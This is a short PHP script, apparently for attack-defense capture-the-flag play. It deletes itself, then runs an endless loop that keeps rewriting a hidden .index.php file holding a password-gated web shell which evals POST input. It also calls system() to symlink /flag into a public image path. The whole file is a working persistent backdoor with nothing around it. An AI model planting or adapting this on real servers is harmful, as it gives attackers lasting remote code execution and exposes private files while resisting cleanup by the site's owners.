<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = 'w4ndell<?php if(md5($_POST["pass"])==="{{PASSWORD}}"){@eval($_POST["W4ndell"]);} ?>';
system('mkdir -p /var/www/html/image/;ln -s /flag /var/www/html/image/title.png');
while (1) {
	if (md5(file_get_contents($file)) !== md5($code)) {
		unlink($file);
		file_put_contents($file, $code);
	}
	usleep(100);
}
